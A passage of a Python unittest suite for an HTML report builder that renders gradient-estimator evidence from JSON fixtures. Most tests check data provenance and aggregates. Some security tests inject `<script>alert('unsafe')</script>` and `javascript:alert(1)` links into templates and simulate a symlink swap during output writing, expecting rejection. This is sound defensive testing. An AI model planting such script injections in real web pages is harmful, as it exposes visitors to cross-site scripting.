            write_fixture_json(path, payload)
            _refresh_manifest(root)

        cases = (
            ("decision", mutate_decision, "decision|pilot|reference"),
            ("runtime", mutate_runtime, "runtime|elapsed|measurement"),
            (
                "path certificate",
                mutate_path_certificate,
                "path|certificate|fully_smoothed|gauge",
            ),
            (
                "contact validity",
                mutate_contact_validity,
                "contact|impulse|physical|validity",
            ),
        )
        for name, mutate, message in cases:
            with self.subTest(name=name):
                root = make_valid_fixture(self)
                mutate(root)
                with self.assertRaisesRegex(builder.BuildError, message):
                    builder.render_report(root=root, template_path=REPORT_TEMPLATE)

    def test_pure_render_uses_only_the_validated_model_snapshot(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        model = builder.load_report(root)
        template = REPORT_TEMPLATE.read_text(encoding="utf-8")

        expected = builder.render_validated_report(model=model, template=template)
        (root / "data/summary.json").write_text("not JSON anymore", encoding="utf-8")
        (root / "assets/figures/analytic_gates.png").write_bytes(b"not PNG anymore")

        self.assertEqual(
            builder.render_validated_report(model=model, template=template),
            expected,
        )

    def test_current_producer_gradient_plot_kind_and_ids_are_supported(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        payload = json.loads(
            (root / "data/plot_data/gradient_quality.json").read_text(encoding="utf-8")
        )
        path_row = next(
            row
            for row in payload["rows"]
            if row.get("kind") == "path_tracer_gradient_quality"
        )
        contact_row = next(
            row
            for row in payload["rows"]
            if row.get("kind") == "contact_3d_gradient_quality"
        )

        page = builder.render_report(root=root, template_path=REPORT_TEMPLATE).decode(
            "utf-8"
        )

        self.assertTrue(path_row["plot_id"].startswith("path-tracer-gradient-quality-"))
        self.assertTrue(
            contact_row["plot_id"].startswith("contact-3d-gradient-quality-")
        )
        self.assertIn(path_row["plot_id"], page)
        self.assertIn(contact_row["plot_id"], page)

    def test_every_fixed_asset_rejects_semantically_wrong_same_family_evidence(self):
        builder = self._builder()
        semantic_validator = getattr(builder, "_validate_figure_semantics", None)
        self.assertIsNotNone(
            semantic_validator,
            "the builder must expose and invoke exact per-asset semantic validation",
        )
        assert semantic_validator is not None

        def mutate(case: str, root: Path) -> None:
            if case in {"analytic", "triangle", "path_gradient", "contact_gradient"}:
                relative = "data/plot_data/gradient_quality.json"
                if case == "analytic":
                    relative = "data/plot_data/analytic_gates.json"
                payload = json.loads((root / relative).read_text(encoding="utf-8"))
                if case == "analytic":
                    payload["rows"][0]["source_row_ids"] = ["analytic:anchor"]
                elif case == "triangle":
                    payload["rows"][0]["x_values"] = [-99.0, 99.0]
                elif case == "path_gradient":
                    row = next(
                        item
                        for item in payload["rows"]
                        if item.get("kind") == "path_tracer_gradient_quality"
                    )
                    row["source_row_ids"] = ["path:optimization:score:0"]
                else:
                    row = next(
                        item
                        for item in payload["rows"]
                        if item.get("kind") == "contact_3d_gradient_quality"
                    )
                    row["source_row_ids"] = ["contact:0"]
            elif case in {"collision", "contact_trajectory", "opaque"}:
                relative = "data/plot_data/validity.json"
                payload = json.loads((root / relative).read_text(encoding="utf-8"))
                if case == "collision":
                    row = next(
                        item
                        for item in payload["rows"]
                        if item.get("kind") == "collision_trajectory"
                    )
                    row["final_positions"] = [[99.0, 99.0]]
                elif case == "contact_trajectory":
                    row = next(
                        item
                        for item in payload["rows"]
                        if item.get("kind") == "contact_trajectory"
                    )
                    row["positions"] = [[[99.0, 99.0, 99.0]]]
                else:
                    row = next(
                        item
                        for item in payload["rows"]
                        if item.get("kind") == "opaque_boundary"
                    )
                    row["values"] = [1, 0]
            elif case in {"path_roles", "path_image", "optimization"}:
                relative = "data/plot_data/optimization.json"
                payload = json.loads((root / relative).read_text(encoding="utf-8"))
                if case == "optimization":
                    row = next(
                        item
                        for item in payload["rows"]
                        if str(item.get("plot_id", "")).startswith("optimization-")
                    )
                    row["values"] = [99.0, 99.0]
                else:
                    row = next(
                        item
                        for item in payload["rows"]
                        if item.get("kind") == "path_render_comparison"
                    )
                    if case == "path_roles":
                        row["source_row_ids"] = [
                            "path:score:8:0",
                            "path:score:8:1",
                            "path:score:8:2",
                        ]
                    else:
                        row["path_target_image"] = [[[0.9, 0.9, 0.9]]]
            elif case == "bias_variance":
                relative = "data/plot_data/bias_variance.json"
                payload = json.loads((root / relative).read_text(encoding="utf-8"))
                payload["rows"][0]["values"] = [99.0]
            elif case == "performance":
                relative = "data/plot_data/performance.json"
                payload = json.loads((root / relative).read_text(encoding="utf-8"))
                payload["rows"][0]["values"] = [99.0, 99.0, 99.0]
            else:  # pragma: no cover - guards the mutation table itself
                raise AssertionError(case)
            write_fixture_json(root / relative, payload)
            _refresh_manifest(root)

        cases = (
            "analytic",
            "triangle",
            "collision",
            "path_roles",
            "path_image",
            "path_gradient",
            "contact_trajectory",
            "contact_gradient",
            "opaque",
            "bias_variance",
            "optimization",
            "performance",
        )
        for case in cases:
            with self.subTest(asset=case):
                root = make_valid_fixture(self)
                mutate(case, root)
                with self.assertRaisesRegex(
                    builder.BuildError, "figure|plot|lineage|source|semantic|mismatch"
                ):
                    semantic_validator(builder.load_report(root))

    def test_duplicate_semantic_asset_identities_are_rejected_before_mapping(self):
        builder = self._builder()
        raw_cases = (
            (
                "path-role",
                "data/raw/path_tracer_gradients.json",
                "path_tracer",
                lambda row: row.get("role") == "comparison_target",
            ),
            (
                "triangle-edge",
                "data/raw/triangle_2d.json",
                "triangle_2d",
                lambda row: row.get("scenario") == "edge_slice",
            ),
            (
                "collision-trajectory",
                "data/raw/collision_2d.json",
                "collision_2d",
                lambda row: "final_positions" in row,
            ),
            (
                "contact-trajectory",
                "data/raw/contact_3d_gradients.json",
                "contact_3d",
                lambda row: "positions" in row,
            ),
            (
                "opaque-boundary",
                "data/raw/opaque_mesh.json",
                "opaque_mesh",
                lambda row: row.get("transform_status") == "estimator_only",
            ),
        )
        for case, relative, scenario, predicate in raw_cases:
            with self.subTest(identity=case):
                root = make_valid_fixture(self)
                raw_path = root / relative
                payload = json.loads(raw_path.read_text(encoding="utf-8"))
                source = next(row for row in payload["rows"] if predicate(row))
                duplicate = json.loads(json.dumps(source))
                duplicate["row_id"] = f"{source['row_id']}:duplicate"
                payload["rows"].append(duplicate)
                write_fixture_json(raw_path, payload)

                summary_path = root / "data/summary.json"
                summary = json.loads(summary_path.read_text(encoding="utf-8"))
                validity = next(
                    row
                    for row in summary["scenario_validity"]
                    if row["scenario"] == scenario
                )
                validity["source_row_ids"].append(duplicate["row_id"])
                validity["metrics"]["row_count"] += 1
                validity["metrics"]["accepted_count"] += 1
                write_fixture_json(summary_path, summary)
                _refresh_manifest(root)

                with self.assertRaisesRegex(builder.BuildError, "duplicate|one-to-one"):
                    builder.render_report(root=root, template_path=REPORT_TEMPLATE)

        root = make_valid_fixture(self)
        plot_path = root / "data/plot_data/bias_variance.json"
        payload = json.loads(plot_path.read_text(encoding="utf-8"))
        payload["rows"].append(json.loads(json.dumps(payload["rows"][0])))
        write_fixture_json(plot_path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(builder.BuildError, "duplicate|one-to-one"):
            builder.render_report(root=root, template_path=REPORT_TEMPLATE)

    def test_path_headline_is_path_only_with_exact_units_and_producer_order_ties(self):
        builder = self._builder()

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_optimization.json"
        path_rows = json.loads(path.read_text(encoding="utf-8"))
        for row in path_rows["rows"]:
            row["initial_hard_loss"] = 3.0
            row["final_hard_loss"] = 2.0
            row["held_out_loss"] = 2.0
            row["deterministic_final_recheck"] = 2.0
            row["losses"][0] = 3.0
            row["losses"][-1] = 2.0
        write_fixture_json(path, path_rows)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        for path_summary in summary["optimization_summaries"]:
            if path_summary["scenario"] != "path_tracer":
                continue
            path_summary.update(
                final_hard_loss_mean=2.0,
                final_hard_loss_ci_low=2.0,
                final_hard_loss_ci_high=2.0,
                held_out_loss_mean=2.0,
            )
        summary["headline_metrics"]["path_best_held_out_loss"].update(
            value=2.0,
            source_row_ids=[path_rows["rows"][0]["row_id"]],
        )
        write_fixture_json(summary_path, summary)
        optimization_plot = root / "data/plot_data/optimization.json"
        plot_payload = json.loads(optimization_plot.read_text(encoding="utf-8"))
        for row in plot_payload["rows"]:
            if row.get("scenario") == "path_tracer" and row.get("kind") is None:
                row["values"] = [2.0, 2.0]
        write_fixture_json(optimization_plot, plot_payload)
        _refresh_manifest(root)
        builder.render_report(root=root, template_path=REPORT_TEMPLATE)

        root = make_valid_fixture(self)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        summary["headline_metrics"]["path_best_held_out_loss"]["unit"] = "seconds"
        write_fixture_json(summary_path, summary)
        _refresh_manifest(root)
        with self.assertRaisesRegex(builder.BuildError, "unit|headline|summary"):
            builder.render_report(root=root, template_path=REPORT_TEMPLATE)

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_optimization.json"
        path_payload = json.loads(path.read_text(encoding="utf-8"))
        path_payload["rows"].reverse()
        write_fixture_json(path, path_payload)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        for index, path_summary in enumerate(summary["optimization_summaries"]):
            if path_summary["scenario"] != "path_tracer":
                continue
            source_ids = [
                row["row_id"]
                for row in path_payload["rows"]
                if row["method"] == path_summary["method"]
            ]
            path_summary["source_row_ids"] = source_ids
            optimization_plot = root / "data/plot_data/optimization.json"
            plot_payload = json.loads(optimization_plot.read_text(encoding="utf-8"))
            plot_row = next(
                row
                for row in plot_payload["rows"]
                if row.get("plot_id") == f"optimization-{index}"
            )
            plot_row["source_row_ids"] = source_ids
            write_fixture_json(optimization_plot, plot_payload)
        summary["headline_metrics"]["path_best_held_out_loss"]["source_row_ids"] = [
            path_payload["rows"][0]["row_id"]
        ]
        write_fixture_json(summary_path, summary)
        _refresh_manifest(root)
        builder.render_report(root=root, template_path=REPORT_TEMPLATE)

    def test_render_is_byte_deterministic_and_contains_complete_semantics(self):
        builder = self._builder()
        root = make_valid_fixture(self)

        first = builder.render_report(root=root, template_path=REPORT_TEMPLATE)
        second = builder.render_report(root=root, template_path=REPORT_TEMPLATE)

        self.assertEqual(first, second)
        page = first.decode("utf-8")
        for section_id in REQUIRED_SECTION_IDS:
            with self.subTest(section_id=section_id):
                self.assertIn(f'id="{section_id}"', page)
        for method in REQUIRED_METHOD_IDS:
            with self.subTest(method=method):
                self.assertIn(f'data-method="{method}"', page)
        self.assertIn(
            "surrogate/pseudo-gradient, not the derivative of the hard execution",
            page,
        )
        self.assertIn("hard forward executions", page)
        self.assertIn("soft forward executions", page)

    def test_check_mode_detects_one_byte_edit_and_atomic_write_repairs_it(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        output = root / "generated-report.html"
        arguments = [
            "--root",
            str(root),
            "--template",
            str(REPORT_TEMPLATE),
            "--output",
            str(output),
        ]
        stdout = io.StringIO()
        stderr = io.StringIO()
        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            self.assertEqual(builder.main(arguments), 0)
        expected = output.read_bytes()
        self.assertTrue(expected)

        edited = bytearray(expected)
        edited[-1] = (edited[-1] + 1) % 256
        output.write_bytes(edited)
        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            self.assertEqual(builder.main([*arguments, "--check"]), 1)
        self.assertEqual(output.read_bytes(), bytes(edited))

        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            self.assertEqual(builder.main(arguments), 0)
        self.assertEqual(output.read_bytes(), expected)
        self.assertEqual(list(root.glob(".generated-report.html.*.tmp")), [])

    def test_every_numeric_cell_and_figure_has_resolvable_provenance(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        page = builder.render_report(root=root, template_path=REPORT_TEMPLATE)
        parser = _RenderedPageParser()
        parser.feed(page.decode("utf-8"))

        numeric_cells = 0
        payloads: dict[str, object] = {}
        for attributes, text in parser.cells:
            displayed = _displayed_numeric_value(text)
            if displayed is None:
                continue
            numeric_cells += 1
            source_file = attributes.get("data-source-file")
            source_key = attributes.get("data-source-key")
            self.assertIsNotNone(source_file, text)
            self.assertIsNotNone(source_key, text)
            assert source_file is not None
            assert source_key is not None
            if source_file not in payloads:
                payloads[source_file] = json.loads(
                    (root / source_file).read_text(encoding="utf-8")
                )
            source_value = _resolve_json_pointer(payloads[source_file], source_key)
            if isinstance(displayed, list):
                self.assertIsInstance(source_value, list, (source_file, source_key))
                self.assertEqual(
                    text,
                    "["
                    + ", ".join(builder.format_number(value) for value in source_value)
                    + "]",
                )
            elif isinstance(source_value, str):
                self.assertEqual(text, source_value)
            else:
                self.assertIsInstance(
                    source_value, (int, float), (source_file, source_key)
                )
                self.assertNotIsInstance(source_value, bool)
                self.assertEqual(text, builder.format_number(source_value))
        self.assertGreater(numeric_cells, 10)

        self.assertGreaterEqual(len(parser.figures), len(FIGURE_NAMES))
        for attributes in parser.figures:
            source_file = attributes["data-source-file"]
            source_key = attributes.get("data-source-key")
            self.assertIsNotNone(source_key)
            payload = json.loads((root / source_file).read_text(encoding="utf-8"))
            record = _resolve_json_pointer(payload, source_key or "")
            self.assertIsInstance(record, dict)
            self.assertEqual(record["plot_id"], attributes.get("data-plot-id"))
            source_keys = json.loads(attributes["data-source-keys"])
            plot_ids = json.loads(attributes["data-plot-ids"])
            self.assertEqual(len(source_keys), len(plot_ids))
            self.assertGreater(len(source_keys), 0)
            for pointer, plot_id in zip(source_keys, plot_ids, strict=True):
                selected = _resolve_json_pointer(payload, pointer)
                self.assertIsInstance(selected, dict)
                self.assertEqual(selected["plot_id"], plot_id)

    def test_every_evidence_cell_figure_and_data_narrative_has_global_provenance(self):
        builder = self._builder()
        canonical_display = getattr(builder, "_canonical_evidence_display", None)
        self.assertIsNotNone(
            canonical_display,
            "sourced evidence cells need one canonical display-value contract",
        )
        assert canonical_display is not None
        root = make_valid_fixture(self)
        page = builder.render_report(root=root, template_path=REPORT_TEMPLATE)
        parser = _RenderedPageParser()
        parser.feed(page.decode("utf-8"))

        payloads: dict[str, object] = {}
        for attributes, text in parser.cells:
            source_file = attributes.get("data-source-file")
            source_key = attributes.get("data-source-key")
            static_key = attributes.get("data-static-key")
            self.assertTrue(
                (
                    source_file is not None
                    and source_key is not None
                    and static_key is None
                )
                or (
                    source_file is None
                    and source_key is None
                    and static_key is not None
                ),
                (attributes, text),
            )
            if source_file is not None and source_key is not None:
                if source_file not in payloads:
                    payloads[source_file] = json.loads(
                        (root / source_file).read_text(encoding="utf-8")
                    )
                source_value = _resolve_json_pointer(payloads[source_file], source_key)
                self.assertEqual(
                    text,
                    canonical_display(source_value),
                    (source_file, source_key, source_value),
                )
            if static_key is not None:
                self.assertIsNone(_displayed_numeric_value(text), (static_key, text))

        expected_assets = {
            *(f"assets/figures/{name}" for name in FIGURE_NAMES),
            *(f"assets/images/{name}" for name in IMAGE_NAMES),
        }
        self.assertEqual(
            {attributes.get("data-asset") for attributes in parser.figures},
            expected_assets,
        )
        for attributes in parser.figures:
            self.assertIn("data-source-file", attributes)
            self.assertIn("data-source-key", attributes)
            self.assertIn("data-source-keys", attributes)
            self.assertIn("data-plot-id", attributes)
            self.assertIn("data-plot-ids", attributes)

        self.assertEqual(len(parser.images), len(expected_assets))
        image_sources = [attributes.get("src") for attributes, _ in parser.images]
        self.assertEqual(set(image_sources), expected_assets)
        self.assertEqual(len(image_sources), len(set(image_sources)))
        figure_image_counts = [0] * len(parser.figures)
        for attributes, parent in parser.images:
            self.assertIsNotNone(parent, attributes)
            assert parent is not None
            figure_image_counts[parent] += 1
            self.assertEqual(
                attributes.get("src"), parser.figures[parent].get("data-asset")
            )
        self.assertTrue(all(count == 1 for count in figure_image_counts))

        self.assertEqual(len(parser.data_narratives), 1)
        narrative = parser.data_narratives[0]
        self.assertIn("data-source-files", narrative)
        self.assertIn("data-source-keys", narrative)
        self.assertEqual(
            len(json.loads(narrative["data-source-files"])),
            len(json.loads(narrative["data-source-keys"])),
        )

    def test_rendered_contract_rejects_unprovenanced_evidence_nodes(self):
        builder = self._builder()
        provenance_validator = getattr(builder, "_validate_evidence_provenance", None)
        self.assertIsNotNone(
            provenance_validator,
            "the builder must validate evidence provenance independently of tests",
        )
        snippets = {
            "cell": "<table><tbody><tr><td>123</td></tr></tbody></table>",
            "wrong_sourced_value": (
                '<table><tbody><tr><td data-source-file="data/summary.json" '
                'data-source-key="#%2Fschema_version">999</td></tr></tbody></table>'
            ),
            "figure": (
                '<figure><img src="assets/images/path_target.png" '
                'alt="unprovenanced"></figure>'
            ),
            "standalone_duplicate_image": (
                '<img src="assets/images/path_target.png" alt="duplicate standalone">'
            ),
            "narrative": '<p class="lede">measured device: 123</p>',
        }
        for name, snippet in snippets.items():
            with self.subTest(node=name):
                root = make_valid_fixture(self)
                template = root / f"unprovenanced-{name}.html"
                template.write_text(
                    REPORT_TEMPLATE.read_text(encoding="utf-8").replace(
                        "</main>", snippet + "</main>"
                    ),
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    builder.BuildError, "provenance|source|evidence|figure|narrative"
                ):
                    builder.render_report(root=root, template_path=template)

    def test_unknown_missing_and_duplicate_template_tokens_are_rejected(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        template = REPORT_TEMPLATE.read_text(encoding="utf-8")
        cases = {
            "unknown": template + "{{UNKNOWN_TOKEN}}",
            "lowercase": template + "{{unknown-token}}",
            "missing": template.replace("{{METHOD_TABLE}}", ""),
            "duplicate": template.replace(
                "{{METHOD_TABLE}}", "{{METHOD_TABLE}}{{METHOD_TABLE}}"
            ),
        }
        for name, text in cases.items():
            with self.subTest(name=name):
                path = root / f"{name}.html"
                path.write_text(text, encoding="utf-8")
                with self.assertRaisesRegex(builder.BuildError, "token|Token|template"):
                    builder.render_report(root=root, template_path=path)

    def test_figure_bindings_reject_wrong_plot_identity_or_lineage(self):
        builder = self._builder()
        for case in ("identity", "lineage"):
            with self.subTest(case=case):
                root = make_valid_fixture(self)
                path = root / "data/plot_data/gradient_quality.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                record = next(
                    row
                    for row in payload["rows"]
                    if str(row.get("scenario", "")).startswith("path_tracer:")
                )
                if case == "identity":
                    record["plot_id"] = "unrelated-plot"
                else:
                    record["source_row_ids"] = ["contact:0"]
                write_fixture_json(path, payload)
                _refresh_manifest(root)

                with self.assertRaisesRegex(
                    builder.BuildError, "figure|plot|lineage|source"
                ):
                    builder.render_report(root=root, template_path=REPORT_TEMPLATE)

    def test_summary_aggregates_are_recomputed_and_exactly_aligned(self):
        builder = self._builder()
        cases = (
            "method_value",
            "method_label",
            "method_sources",
            "optimization_value",
            "performance_value",
            "validity_value",
            "headline_value",
        )
        for case in cases:
            with self.subTest(case=case):
                root = make_valid_fixture(self)
                path = root / "data/summary.json"
                summary = json.loads(path.read_text(encoding="utf-8"))
                path_summary = next(
                    row
                    for row in summary["method_summaries"]
                    if row["scenario"].startswith("path_tracer:")
                )
                if case == "method_value":
                    path_summary["mean_gradient"] = [1.0]
                elif case == "method_label":
                    path_summary["scenario"] = "contact_3d:wrong:start"
                elif case == "method_sources":
                    path_summary["source_row_ids"] = ["analytic:score"]
                elif case == "optimization_value":
                    summary["optimization_summaries"][0]["final_hard_loss_mean"] = 1.0
                elif case == "performance_value":
                    summary["performance_summaries"][0]["warm_median"] = 1.0
                elif case == "validity_value":
                    summary["scenario_validity"][0]["accepted"] = False
                elif case == "headline_value":
                    summary["headline_metrics"]["path_best_held_out_loss"]["value"] = (
                        1.0
                    )
                write_fixture_json(path, summary)
                _refresh_manifest(root)

                with self.assertRaisesRegex(
                    builder.BuildError, "aggregate|lineage|mismatch|summary"
                ):
                    builder.render_report(root=root, template_path=REPORT_TEMPLATE)

    def test_zero_reference_metrics_remain_unavailable_through_rendering(self):
        builder = self._builder()
        root = make_valid_fixture(self)

        raw = json.loads((root / "data/raw/analytic.json").read_text(encoding="utf-8"))
        for field in ("relative_error", "cosine_similarity", "sign_agreement"):
            self.assertIsNone(raw["rows"][0][field])

        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        metric_fields = ("relative_error", "cosine_similarity", "sign_agreement")
        for row in summary["method_summaries"]:
            for field in metric_fields:
                self.assertIsNone(row[field])

        plot_path = root / "data/plot_data/gradient_quality.json"
        plot = json.loads(plot_path.read_text(encoding="utf-8"))
        for row in plot["rows"]:
            if row.get("kind") in {
                "path_tracer_gradient_quality",
                "contact_3d_gradient_quality",
            }:
                self.assertEqual(row["values"], [None])

        model = builder.load_report(root)
        for row in model.summary.method_summaries:
            for field in metric_fields:
                self.assertIsNone(getattr(row, field))
        gradient_plot = model.plots["data/plot_data/gradient_quality.json"]
        self.assertTrue(
            all(
                record.raw["values"] == (None,)
                for record in gradient_plot.rows
                if record.raw.get("kind")
                in {
                    "path_tracer_gradient_quality",
                    "contact_3d_gradient_quality",
                }
            )
        )

        page = builder.render_report(root=root, template_path=REPORT_TEMPLATE)
        parser = _RenderedPageParser()
        parser.feed(page.decode("utf-8"))
        sourced_cells = {
            unquote(attributes.get("data-source-key", "")): text
            for attributes, text in parser.cells
            if attributes.get("data-source-file") == "data/summary.json"
        }
        for index in range(len(summary["method_summaries"])):
            for field in metric_fields:
                self.assertEqual(
                    sourced_cells[f"#/method_summaries/{index}/{field}"],
                    "unavailable",
                )

    def test_summary_aggregate_rejects_sub_tolerance_binary64_drift(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        path = root / "data/summary.json"
        summary = json.loads(path.read_text(encoding="utf-8"))
        summary["method_summaries"][0]["empirical_bias"][0] = 5.0e-13
        write_fixture_json(path, summary)
        _refresh_manifest(root)

        with self.assertRaisesRegex(builder.BuildError, "aggregate|mismatch|summary"):
            builder.load_report(root)

    def test_direct_script_uses_custom_root_defaults(self):
        root = make_valid_fixture(self)
        (root / "report_template.html").write_bytes(REPORT_TEMPLATE.read_bytes())
        live_index = REPORT_TEMPLATE.with_name("index.html")
        live_before = live_index.read_bytes()

        completed = subprocess.run(
            [
                sys.executable,
                str(BUILD_SCRIPT),
                "--root",
                str(root),
            ],
            cwd=REPORT_TEMPLATE.parents[1],
            text=True,
            capture_output=True,
            check=False,
            timeout=30,
        )

        self.assertEqual(completed.returncode, 0, completed.stderr)
        self.assertIn("WROTE:", completed.stdout)
        self.assertEqual(live_index.read_bytes(), live_before)
        self.assertIn(
            'id="reproducibility"', (root / "index.html").read_text(encoding="utf-8")
        )
        validate_publication(root)

    def test_output_guards_reject_template_and_bundle_overwrites(self):
        builder = self._builder()
        for destination in ("template", "bundle"):
            with self.subTest(destination=destination):
                root = make_valid_fixture(self)
                template = root / "report_template.html"
                template.write_bytes(REPORT_TEMPLATE.read_bytes())
                output = (
                    template
                    if destination == "template"
                    else root / "data/summary.json"
                )
                before = output.read_bytes()

                with self.assertRaisesRegex(
                    builder.BuildError, "output|template|bundle|artifact"
                ):
                    builder.build_report(
                        root=root, output=output, template_path=template
                    )
                self.assertEqual(output.read_bytes(), before)

    def test_atomic_output_failures_are_normalized_to_build_error(self):
        builder = self._builder()
        destination_opener = getattr(builder, "_open_output_destination", None)
        self.assertIsNotNone(
            destination_opener,
            "atomic writes need a retained no-follow destination directory",
        )
        assert destination_opener is not None
        root = make_valid_fixture(self)
        output = root / "already-a-directory"
        output.mkdir()

        destination = destination_opener(
            root=root, output=output, template_path=REPORT_TEMPLATE
        )
        try:
            with self.assertRaisesRegex(builder.BuildError, "write|output|directory"):
                builder._atomic_write(destination, b"rendered")
        finally:
            destination.close()

        stdout = io.StringIO()
        stderr = io.StringIO()
        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            result = builder.main(
                [
                    "--root",
                    str(root),
                    "--template",
                    str(REPORT_TEMPLATE),
                    "--output",
                    str(output),
                ]
            )
        self.assertEqual(result, 1)
        self.assertIn("ERROR:", stderr.getvalue())
        self.assertNotIn("Traceback", stderr.getvalue())

    def test_output_ancestor_swap_during_render_cannot_redirect_atomic_write(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        publish = root / "publish"
        publish.mkdir()
        output = publish / "summary.json"
        displaced = root / "publish-before-swap"
        evidence = root / "data/summary.json"
        evidence_before = evidence.read_bytes()
        real_render = builder.render_report

        def render_then_swap(*, root: Path, template_path: Path) -> bytes:
            rendered = real_render(root=root, template_path=template_path)
            publish.rename(displaced)
            publish.symlink_to(root / "data", target_is_directory=True)
            return rendered

        with mock.patch.object(builder, "render_report", side_effect=render_then_swap):
            with self.assertRaisesRegex(
                builder.BuildError, "changed|race|directory|output"
            ):
                builder.build_report(
                    root=root, output=output, template_path=REPORT_TEMPLATE
                )

        self.assertEqual(evidence.read_bytes(), evidence_before)
        self.assertFalse((displaced / "summary.json").exists())

    def test_atomic_cleanup_failure_does_not_mask_primary_write_error(self):
        builder = self._builder()
        destination_opener = getattr(builder, "_open_output_destination", None)
        self.assertIsNotNone(
            destination_opener,
            "atomic writes need a retained no-follow destination directory",
        )
        assert destination_opener is not None
        root = make_valid_fixture(self)
        output = root / "publish" / "report.html"
        destination = destination_opener(
            root=root, output=output, template_path=REPORT_TEMPLATE
        )
        try:
            with (
                mock.patch.object(
                    builder.os,
                    "replace",
                    side_effect=OSError("primary replace failure"),
                ),
                mock.patch.object(
                    builder.os,
                    "unlink",
                    side_effect=OSError("cleanup failure"),
                ),
            ):
                with self.assertRaisesRegex(
                    builder.BuildError, "primary replace failure"
                ) as raised:
                    builder._atomic_write(destination, b"rendered")
            self.assertNotIn("cleanup failure", str(raised.exception))
        finally:
            destination.close()

    def test_output_path_resolution_failures_are_build_errors(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        first = root / "output-loop-a"
        second = root / "output-loop-b"
        first.symlink_to(second, target_is_directory=True)
        second.symlink_to(first, target_is_directory=True)

        with self.assertRaisesRegex(
            builder.BuildError, "resolve|symlink|filesystem|output"
        ):
            builder.build_report(
                root=root,
                output=first / "report.html",
                template_path=REPORT_TEMPLATE,
            )

    def test_direct_render_template_path_failures_are_build_errors(self):
        builder = self._builder()
        root = make_valid_fixture(self)

        with self.assertRaisesRegex(builder.BuildError, "template|filesystem|read"):
            builder.render_report(
                root=root,
                template_path=Path("invalid\0template.html"),
            )

    def test_active_rendered_html_is_rejected_before_write(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        malicious = root / "malicious-template.html"
        malicious.write_text(
            REPORT_TEMPLATE.read_text(encoding="utf-8").replace(
                "</body>", "<script>alert('unsafe')</script></body>"
            ),
            encoding="utf-8",
        )
        output = root / "generated-report.html"
        output.write_bytes(b"existing-safe-page")

        with self.assertRaisesRegex(builder.BuildError, "active|unsafe|script"):
            builder.build_report(root=root, output=output, template_path=malicious)
        self.assertEqual(output.read_bytes(), b"existing-safe-page")

    def test_duplicate_html_attributes_are_rejected_before_render_or_write(self):
        builder = self._builder()
        snippets = (
            '<a href="javascript:alert(1)" href="https://example.com">unsafe</a>',
            '<a HREF="javascript:alert(1)" href="https://example.com">unsafe</a>',
        )
        for snippet in snippets:
            for entry_point in ("render", "build"):
                with self.subTest(snippet=snippet, entry_point=entry_point):
                    root = make_valid_fixture(self)
                    template = root / "duplicate-attribute-template.html"
                    template.write_text(
                        REPORT_TEMPLATE.read_text(encoding="utf-8").replace(
                            "</main>", snippet + "</main>"
                        ),
                        encoding="utf-8",
                    )
                    if entry_point == "render":
                        with self.assertRaisesRegex(
                            builder.BuildError,
                            "duplicate.*attribute|attribute.*duplicate",
                        ):
                            builder.render_report(root=root, template_path=template)
                        continue
                    output = root / "generated-report.html"
                    output.write_bytes(b"existing-safe-page")
                    with self.assertRaisesRegex(
                        builder.BuildError,
                        "duplicate.*attribute|attribute.*duplicate",
                    ):
                        builder.build_report(
                            root=root,
                            output=output,
                            template_path=template,
                        )
                    self.assertEqual(output.read_bytes(), b"existing-safe-page")

    def test_embedded_nul_output_path_is_normalized_to_build_error(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        output = Path(f"{root}/generated\0-report.html")

        with self.assertRaisesRegex(
            builder.BuildError, "resolve|output|filesystem|null|NUL"
        ):
            builder.build_report(
                root=root, output=output, template_path=REPORT_TEMPLATE
            )

    def test_embedded_nul_output_path_has_concise_cli_failure(self):
        builder = self._builder()
        root = make_valid_fixture(self)
        output = f"{root}/generated\0-report.html"
        stdout = io.StringIO()
        stderr = io.StringIO()

        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            result = builder.main(
                [
                    "--root",
                    str(root),
                    "--template",
                    str(REPORT_TEMPLATE),
                    "--output",
                    output,
                ]
            )

        self.assertEqual(result, 1)
        self.assertIn("ERROR:", stderr.getvalue())
        self.assertNotIn("Traceback", stderr.getvalue())

    def test_loader_failures_are_normalized_to_build_error(self):
        builder = self._builder()

        root = make_valid_fixture(self)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        summary["headline_metrics"]["analytic_anchor_accepted"]["value"] = 10**4000
        write_fixture_json(summary_path, summary)
        _refresh_manifest(root)
        with self.assertRaisesRegex(builder.BuildError, "finite|numeric|overflow"):
            builder.render_report(root=root, template_path=REPORT_TEMPLATE)

        root = make_valid_fixture(self)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        summary["performance_summaries"][0]["method"] = "unknown_method"
        write_fixture_json(summary_path, summary)
        _refresh_manifest(root)
        with self.assertRaisesRegex(builder.BuildError, "unknown method"):
            builder.render_report(root=root, template_path=REPORT_TEMPLATE)

    def test_report_renders_explicit_estimator_identities_and_tradeoffs(self):
        builder = self._builder()
        page = builder.render_report(
            root=make_valid_fixture(self), template_path=REPORT_TEMPLATE
        ).decode("utf-8")

        for label in (
            "Gaussian-smoothed hard objective",
